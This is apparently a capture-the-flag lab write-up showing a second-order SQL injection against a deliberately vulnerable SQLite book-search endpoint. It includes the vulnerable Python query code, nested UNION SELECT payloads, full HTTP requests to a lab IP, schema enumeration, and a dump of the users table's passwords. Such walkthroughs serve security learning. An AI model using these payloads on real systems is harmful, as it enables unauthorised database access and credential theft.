# Challenge 12: Vulnerable Startup: Book Title 2

> In this challenge, the application performs a query early in the process. It then uses the result from the first query in the second query later without sanitization. Both queries are vulnerable, and the first query can be exploited through blind SQL injection. However, since the second query is also vulnerable, it is possible to simplify the exploitation and use UNION based injection instead of Boolean-based blind injection; making the exploitation easier and less noisy. The goal of the task is to abuse this vulnerability without using blind SQL injection and retrieve the flag.

The goal of the challenge is to execute a second-order SQL injection attack to retrieve the flag. An initial query is executed and its results are used in a second query. The initial query can be executed blindly and the second query isn't blind. The challenge is to leverage the first query to inject into the second query to retrieve the flag.

The description gives the two queries. In the book search function at `/book?title=$TITLE`, the backend first executes a query to get the book ID of a single book that begins with `$TITLE`, case-insensitive. It then retrieves the entire row with that book ID.

```python
bid = db.sql_query(f"SELECT id FROM books WHERE title like '{title}%'", one=True)
if bid:
    query = f"SELECT * FROM books WHERE id = '{bid['id']}'"
```

To inject into the second query, one has to be able to manipulate the response from the first query. This seems possible by injecting a `UNION SELECT` statement. Since the backend application code that executes the first query only takes the first row (indicated by the `one=True` parameter passed into the `db.sql_query()` function), it is paramount that the injected string is ordered before the actual book ID in the resultant row set. This can be achieved via an `ORDER BY 1 ASC` or `ORDER BY 1 DESC` clause.

The first injection:

```sql
SELECT id FROM books WHERE title like '%' UNION SELECT '2' ORDER BY 1 DESC--%'
```

Which results in the second injection:

```sql
SELECT * FROM books WHERE id = '2'
```

The request:

```http
GET /challenge7/book?title=%'+UNION+SELECT+'2'+ORDER+BY+1+DESC-- HTTP/1.1
Host: 10.10.117.172:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://10.10.117.172:5000/challenge7/book?title=test
Cookie: session=.eJyrVkrOSMzJSc1LTzWPLy1OLYrPTFGyMtNBF85LzE1VslIqSc_MSFPSUcpNzMxLLCiILyxNLapUskpLzClOrQUAHokbmg.YRAuIw.xCLFXd0gukPKf86TSY3qmUuGtRo
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

This injection results in the book titled `Booktitle` being rendered, indicating that the injection was successful.

The next step is to determine how many columns are being returned from the second query. Use the incremental `ORDER BY` method, which will result in the following injections:

```sql
SELECT id FROM books WHERE title like '%' UNION SELECT '1'' ORDER BY 1--' ORDER BY 1 DESC--%'
```

```sql
SELECT * FROM books WHERE id = '1' ORDER BY 1--'
```

```http
GET /challenge7/book?title=%'+UNION+SELECT+'1''+ORDER+BY+5--'+ORDER+BY+1+DESC-- HTTP/1.1
Host: 10.10.117.172:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://10.10.117.172:5000/challenge7/book?title=test
Cookie: session=.eJyrVkrOSMzJSc1LTzWPLy1OLYrPTFGyMtNBF85LzE1VslIqSc_MSFPSUcpNzMxLLCiILyxNLapUskpLzClOrQUAHokbmg.YRAuIw.xCLFXd0gukPKf86TSY3qmUuGtRo
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

Ordering by indexes 1-4 results in the book `Harry Potter and the Philosopher's Stone` being returned, whereas ordering by index 5 results in no book being returned. This indicates that the database is throwing an error and not returning any rows because there is no row at index 5, which in turn indicates that there are 4 rows in the resultant row set.

Based on the first query, one of these rows is `id`. Based on the rendered output from the query, the remaining three rows are probably `title`, `description`, and `author`. The latter three rows are almost certainly of type string as well.

Confirm that it is possible to inject and receive output via a `UNION SELECT` on the second injection.

```sql
SELECT id FROM books WHERE title like '%' UNION SELECT '1'' UNION SELECT 1,''a'',''b'',''c''--' ORDER BY 1 DESC--%'
```

```sql
SELECT * FROM books WHERE id = '1' UNION SELECT 1,'a','b','c'--'
```

```http
GET /challenge7/book?title=%'+UNION+SELECT+'1''+UNION+SELECT+1,''a'',''b'',''c''--'+ORDER+BY+1+DESC-- HTTP/1.1
Host: 10.10.117.172:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://10.10.117.172:5000/challenge7/book?title=test
Cookie: session=.eJyrVkrOSMzJSc1LTzWPLy1OLYrPTFGyMtNBF85LzE1VslIqSc_MSFPSUcpNzMxLLCiILyxNLapUskpLzClOrQUAHokbmg.YRAuIw.xCLFXd0gukPKf86TSY3qmUuGtRo
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

Success!

![](Pasted%20image%2020210808155838.png)

Determine the names of the non-SQLite system tables.

```sql
SELECT id FROM books WHERE title like '%' UNION SELECT '1'' UNION SELECT 1,''a'',name,''c'' FROM sqlite_master WHERE type=''table'' AND name NOT LIKE ''sqlite_%''--' ORDER BY 1 DESC--%'
```

```sql
SELECT * FROM books WHERE id = '1' UNION SELECT 1,'a',name,'c' FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'--'
```

```http
GET /challenge7/book?title=%'+UNION+SELECT+'1''+UNION+SELECT+1,''a'',name,''c''+FROM+sqlite_master+WHERE+type=''table''+AND+name+NOT+LIKE+''sqlite_%''--'+ORDER+BY+1+DESC-- HTTP/1.1
Host: 10.10.117.172:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://10.10.117.172:5000/challenge7/book?title=test
Cookie: session=.eJyrVkrOSMzJSc1LTzWPLy1OLYrPTFGyMtNBF85LzE1VslIqSc_MSFPSUcpNzMxLLCiILyxNLapUskpLzClOrQUAHokbmg.YRAuIw.xCLFXd0gukPKf86TSY3qmUuGtRo
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

There are three tables: `books`, `notes`, and `users`.

![](Pasted%20image%2020210808160310.png)

Dump each table's `CREATE TABLE` statement to determine its number of columns, column names, and column types.

```sql
SELECT id FROM books WHERE title like '%' UNION SELECT '1'' UNION SELECT 1,''a'',sql,''c'' FROM sqlite_master WHERE type=''table'' AND name NOT LIKE ''sqlite_%''--' ORDER BY 1 DESC--%'
```

```sql
SELECT * FROM books WHERE id = '1' UNION SELECT 1,'a',sql,'c' FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'--'
```

```http
GET /challenge7/book?title=%'+UNION+SELECT+'1''+UNION+SELECT+1,''a'',sql,''c''+FROM+sqlite_master+WHERE+type=''table''+AND+name+NOT+LIKE+''sqlite_%''--'+ORDER+BY+1+DESC-- HTTP/1.1
Host: 10.10.117.172:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://10.10.117.172:5000/challenge7/book?title=test
Cookie: session=.eJyrVkrOSMzJSc1LTzWPLy1OLYrPTFGyMtNBF85LzE1VslIqSc_MSFPSUcpNzMxLLCiILyxNLapUskpLzClOrQUAHokbmg.YRAuIw.xCLFXd0gukPKf86TSY3qmUuGtRo
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

#### `books`

```sql
CREATE TABLE books (
    id integer primary key,
    title text not null,
    description text not null,
    author text not null
)
```

#### `notes`

```sql
CREATE TABLE notes (
    id integer primary key,
    username text not null,
    title text not null,
    note text not null
)
```

#### `users`

```sql
CREATE TABLE users (
    id integer primary key,
    username text unique not null,
    password text not null
)
```

Based on past experiences in this room, the flag is likely in the `users` table. Dump it.

```sql
SELECT id FROM books WHERE title like '%' UNION SELECT '1'' UNION SELECT 1,id,username,password FROM users--' ORDER BY 1 DESC--%'
```

```sql
SELECT * FROM books WHERE id = '1' UNION SELECT 1,id,username,password FROM users--'
```

```http
GET /challenge7/book?title=%'+UNION+SELECT+'1''+UNION+SELECT+1,id,username,password+FROM+users--'+ORDER+BY+1+DESC-- HTTP/1.1
Host: 10.10.117.172:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://10.10.117.172:5000/challenge7/book?title=test
Cookie: session=.eJyrVkrOSMzJSc1LTzWPLy1OLYrPTFGyMtNBF85LzE1VslIqSc_MSFPSUcpNzMxLLCiILyxNLapUskpLzClOrQUAHokbmg.YRAuIw.xCLFXd0gukPKf86TSY3qmUuGtRo
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

The flag is `admin`'s password.

![](Pasted%20image%2020210808161045.png)
